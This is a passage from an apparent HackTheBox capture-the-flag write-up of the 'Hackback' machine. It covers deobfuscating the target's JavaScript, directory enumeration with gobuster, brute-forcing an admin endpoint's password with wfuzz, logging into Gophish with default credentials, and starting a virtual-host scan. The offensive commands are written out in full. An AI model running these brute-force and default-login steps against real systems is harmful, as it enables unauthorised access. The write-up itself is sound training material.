    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">c</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">c</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="nx">e</span><span class="p">(</span><span class="o">++</span><span class="nx">d</span><span class="p">);</span>
<span class="p">}(</span><span class="nx">a</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">));</span>
<span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span> <span class="o">-</span> <span class="mh">0x0</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">c</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">MsULmv</span><span class="dl">'</span><span class="p">]</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">f</span><span class="p">;</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="nb">Function</span><span class="p">(</span><span class="dl">'</span><span class="s1">return</span><span class="se">\</span><span class="s1">x20(function()</span><span class="se">\</span><span class="s1">x20</span><span class="dl">'</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">{}.constructor(</span><span class="se">\</span><span class="s1">x22return</span><span class="se">\</span><span class="s1">x20this</span><span class="se">\</span><span class="s1">x22)(</span><span class="se">\</span><span class="s1">x20)</span><span class="dl">'</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">);</span><span class="dl">'</span><span class="p">);</span>
                <span class="nx">f</span> <span class="o">=</span> <span class="nx">g</span><span class="p">();</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">f</span> <span class="o">=</span> <span class="nb">window</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span><span class="dl">'</span><span class="p">;</span>
            <span class="nx">f</span><span class="p">[</span><span class="dl">'</span><span class="s1">atob</span><span class="dl">'</span><span class="p">]</span> <span class="o">||</span> <span class="p">(</span><span class="nx">f</span><span class="p">[</span><span class="dl">'</span><span class="s1">atob</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">j</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">j</span><span class="p">)[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/=+$/</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
                <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">l</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="nx">m</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">o</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="nx">p</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">k</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">o</span><span class="o">++</span><span class="p">);</span> <span class="o">~</span><span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">m</span> <span class="o">=</span> <span class="nx">l</span> <span class="o">%</span> <span class="mh">0x4</span> <span class="p">?</span> <span class="nx">m</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="nx">n</span> <span class="p">:</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">l</span><span class="o">++</span> <span class="o">%</span> <span class="mh">0x4</span><span class="p">)</span> <span class="p">?</span> <span class="nx">p</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">[</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="mh">0xff</span> <span class="o">&amp;</span> <span class="nx">m</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="o">-</span><span class="mh">0x2</span> <span class="o">*</span> <span class="nx">l</span> <span class="o">&amp;</span> <span class="mh">0x6</span><span class="p">))</span> <span class="p">:</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">n</span> <span class="o">=</span> <span class="nx">i</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">n</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nx">p</span><span class="p">;</span>
            <span class="p">});</span>
        <span class="p">}());</span>
        <span class="kd">var</span> <span class="nx">q</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">[],</span>
                <span class="nx">u</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
                <span class="nx">v</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="dl">''</span><span class="p">,</span>
                <span class="nx">x</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
            <span class="nx">r</span> <span class="o">=</span> <span class="nx">atob</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span>
            <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">r</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">y</span> <span class="o">&lt;</span> <span class="nx">z</span><span class="p">;</span> <span class="nx">y</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">x</span> <span class="o">+=</span> <span class="dl">'</span><span class="s1">%</span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="dl">'</span><span class="s1">00</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">r</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">)[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">](</span><span class="mh">0x10</span><span class="p">))[</span><span class="dl">'</span><span class="s1">slice</span><span class="dl">'</span><span class="p">](</span><span class="o">-</span><span class="mh">0x2</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nx">r</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
            <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">A</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="nx">A</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="nx">A</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span> <span class="o">=</span> <span class="nx">A</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">for</span> <span class="p">(</span><span class="nx">A</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="nx">A</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="nx">A</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">u</span> <span class="o">=</span> <span class="p">(</span><span class="nx">u</span> <span class="o">+</span> <span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span> <span class="o">+</span> <span class="nx">d</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">A</span> <span class="o">%</span> <span class="nx">d</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]))</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">;</span>
                <span class="nx">v</span> <span class="o">=</span> <span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">];</span>
                <span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span> <span class="o">=</span> <span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">];</span>
                <span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">]</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nx">A</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
            <span class="nx">u</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
            <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">B</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="nx">B</span> <span class="o">&lt;</span> <span class="nx">r</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">B</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">A</span> <span class="o">=</span> <span class="p">(</span><span class="nx">A</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">;</span>
                <span class="nx">u</span> <span class="o">=</span> <span class="p">(</span><span class="nx">u</span> <span class="o">+</span> <span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">])</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">;</span>
                <span class="nx">v</span> <span class="o">=</span> <span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">];</span>
                <span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span> <span class="o">=</span> <span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">];</span>
                <span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">]</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
                <span class="nx">w</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">[</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">r</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">B</span><span class="p">)</span> <span class="o">^</span> <span class="nx">t</span><span class="p">[(</span><span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span> <span class="o">+</span> <span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">])</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">]);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="nx">w</span><span class="p">;</span>
        <span class="p">};</span>
        <span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">OoACcd</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">q</span><span class="p">;</span>
        <span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">qSLwGk</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
        <span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">MsULmv</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="o">!!</span><span class="p">[];</span>
    <span class="p">}</span>
    <span class="kd">var</span> <span class="nx">C</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">qSLwGk</span><span class="dl">'</span><span class="p">][</span><span class="nx">c</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">C</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">pIjlQB</span><span class="dl">'</span><span class="p">]</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">pIjlQB</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="o">!!</span><span class="p">[];</span>
        <span class="p">}</span>
        <span class="nx">e</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">OoACcd</span><span class="dl">'</span><span class="p">](</span><span class="nx">e</span><span class="p">,</span> <span class="nx">d</span><span class="p">);</span>
        <span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">qSLwGk</span><span class="dl">'</span><span class="p">][</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">e</span> <span class="o">=</span> <span class="nx">C</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">e</span><span class="p">;</span>
<span class="p">};</span>
<span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x53</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x4c</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x42</span><span class="se">\</span><span class="s1">x79</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x73</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">'</span><span class="s1">0x0</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x50</span><span class="se">\</span><span class="s1">x5d</span><span class="se">\</span><span class="s1">x53</span><span class="se">\</span><span class="s1">x36</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">h</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">'</span><span class="s1">0x1</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x54</span><span class="se">\</span><span class="s1">x59</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">'</span><span class="s1">0x2</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x67</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x3f</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x3d</span><span class="se">\</span><span class="s1">x28</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x78</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x29</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x26</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x3d</span><span class="se">\</span><span class="s1">x28</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x79</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x66</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x62</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x6b</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x6b</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x62</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x78</span><span class="se">\</span><span class="s1">x29</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x26</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x64</span><span class="se">\</span><span class="s1">x3d</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x26</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x3d</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x4e</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x6d</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x79</span><span class="dl">'</span><span class="p">;</span>
</code></pre></div></div>
<p>As you can see it’s still heavily obfuscated, I solved this by pasting the code in the <code class="language-plaintext highlighter-rouge">js</code> console. It will do the magic happening in these functions then we can just read the variables at the bottom of the script : <code class="language-plaintext highlighter-rouge">x z h y t s i k w</code>
<br><img src="/images/hackthebox/hackback/9.png" alt="" class="align-center"><br><br>
We got this message :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Secure Login Bypass
Remember the secret path is
2bb6916122f1da34dcd916421e531578
Just in case I loose access to the admin panel
?action=(show,list,exec,init)
&amp;site=(twitter,paypal,facebook,hackthebox)
&amp;password=*****
&amp;session=
Nothing more to say
</code></pre></div></div>
<p>Going to that path only caused a redirect, so we need to enumerate more.<br></p>

<h2 id="accessing-the-secret-path">Accessing the Secret Path</h2>
<p>From the secret message we know what parameters it’s expecting us to send : (<code class="language-plaintext highlighter-rouge">?action=&amp;site=&amp;password=&amp;session=</code>). This is probably gonna be a <code class="language-plaintext highlighter-rouge">php</code> page. So I ran <code class="language-plaintext highlighter-rouge">gobuster</code> on that path with the same wordlist I used before and <code class="language-plaintext highlighter-rouge">.php</code> extension :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -w /usr/share/wordlists/dirb/common.txt -x php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/07/05 10:08:09 Starting gobuster
=====================================================
/webadmin.php (Status: 302)
</code></pre></div></div>
<p>Great we got <code class="language-plaintext highlighter-rouge">webadmin.php</code>, I tried again and now I didn’t get a redirect :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=test&amp;session='
Wrong secret key!
</code></pre></div></div>
<p>But I got <code class="language-plaintext highlighter-rouge">Wrong secret key!</code>, and that’s expected because I set the password to <code class="language-plaintext highlighter-rouge">test</code>. I used <code class="language-plaintext highlighter-rouge">wfuzz</code> again with <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt" target="_blank" rel="noopener noreferrer">darkweb2017-top10000.txt</a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">seclists</a> to bruteforce the password which happened to be a very easy one :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -u 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=FUZZ&amp;session=' -w darkweb2017-top10000.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=FUZZ&amp;session=
Total requests: 10000

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=302      0 L        3 W           17 Ch        "123456"
000004:  C=302      0 L        3 W           17 Ch        "password"
000006:  C=302      0 L        3 W           17 Ch        "abc123"
000005:  C=302      0 L        3 W           17 Ch        "qwerty"
000007:  C=302      7 L       15 W          197 Ch        "12345678"
000008:  C=302      0 L        3 W           17 Ch        "password1"
000009:  C=302      0 L        3 W           17 Ch        "1234567"
000010:  C=302      0 L        3 W           17 Ch        "123123"
000002:  C=302      0 L        3 W           17 Ch        "123456789"
000003:  C=302      0 L        3 W           17 Ch        "111111"
000011:  C=302      0 L        3 W           17 Ch        "1234567890"
000012:  C=302      0 L        3 W           17 Ch        "000000"
000013:  C=302      0 L        3 W           17 Ch        "12345"
^C
Finishing pending requests...
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">12345678</code> gave a different response length so it’s probably the password :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="o">:~/</span><span class="nc">Desktop</span><span class="o">/</span><span class="no">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">hackback</span><span class="c1"># curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=12345678&amp;session='</span>
<span class="k">Array</span>
<span class="p">(</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span>
    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">..</span>
    <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">7</span><span class="n">cb114055494cb503306a0edd1ad1d398f6fb18e28a7a62883c24fd8ab34f66b</span><span class="mf">.</span><span class="n">log</span>
    <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7</span><span class="mf">.</span><span class="n">log</span>
<span class="p">)</span>
</code></pre></div></div>
<p>Yes it worked. I added my <code class="language-plaintext highlighter-rouge">PHPSESSID</code> cookie with the <code class="language-plaintext highlighter-rouge">-b</code> option and I also added it to <code class="language-plaintext highlighter-rouge">&amp;session=</code>, because some stuff didn’t work without including the session cookie.<br>
<code class="language-plaintext highlighter-rouge">list</code> showed us some logs. I tried the other actions, <code class="language-plaintext highlighter-rouge">exec</code> said <code class="language-plaintext highlighter-rouge">Missing command</code> but I couldn’t make it execute anything. <code class="language-plaintext highlighter-rouge">init</code> didn’t output anything but most likely it’s doing something that doesn’t produce an output. Also <code class="language-plaintext highlighter-rouge">show</code> didn’t result in any output but we will make it do soon.<br></p>

<h2 id="gophish">Gophish</h2>
<p>Let’s take a look at the full <code class="language-plaintext highlighter-rouge">nmap</code> scan :
<code class="language-plaintext highlighter-rouge">nmap -T5 -p- hackback.htb --max-retries 1 </code>
<br><img src="/images/hackthebox/hackback/10.png" alt="" class="align-center"><br><br>
There’s another 3rd port : <code class="language-plaintext highlighter-rouge">64831</code>. I scanned that port with <code class="language-plaintext highlighter-rouge">nmap</code> :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC -p 64831 hackback.htb</code>
<br><img src="/images/hackthebox/hackback/11.png" alt="" class="align-center"><br><br>
It’s <code class="language-plaintext highlighter-rouge">https</code>. I went there and it was <code class="language-plaintext highlighter-rouge">gophish</code> :
<br><img src="/images/hackthebox/hackback/12.png" alt="" class="align-center"><br><br></p>

<blockquote>
  <p>Gophish is a powerful, open-source phishing framework that makes it easy to test your organization’s exposure to phishing. -<a href="https://getgophish.com/" target="_blank" rel="noopener noreferrer">getgophish.com</a></p>
</blockquote>

<p>I tried to login with the default credentials : <code class="language-plaintext highlighter-rouge">admin : gophish</code> and it worked :
<br><img src="/images/hackthebox/hackback/13.png" alt="" class="align-center"><br><br>
It was kinda empty but I found some email templates for Facebook, HackTheBox, PayPal and Twitter.<br>
<br><img src="/images/hackthebox/hackback/14.png" alt="" class="align-center"><br><br>
So there are phishing sites somewhere for these sites and now we can understand what’s happening in the secret path. It’s an endpoint that shows the collected data from the phishing sites. I created a small list to search for HackTheBox phishing site :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hackthebox
hacktheboxeu
hackthebox.eu
htb
www.hackthebox
www.hacktheboxeu
www.hackthebox.eu
www.htb
</code></pre></div></div>
<p>Then I used <code class="language-plaintext highlighter-rouge">wfuzz</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -c -w list.txt -H "HOST: FUZZ.htb" http://10.10.10.128

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****

Target: http://10.10.10.128/
Total requests: 9

==================================================================
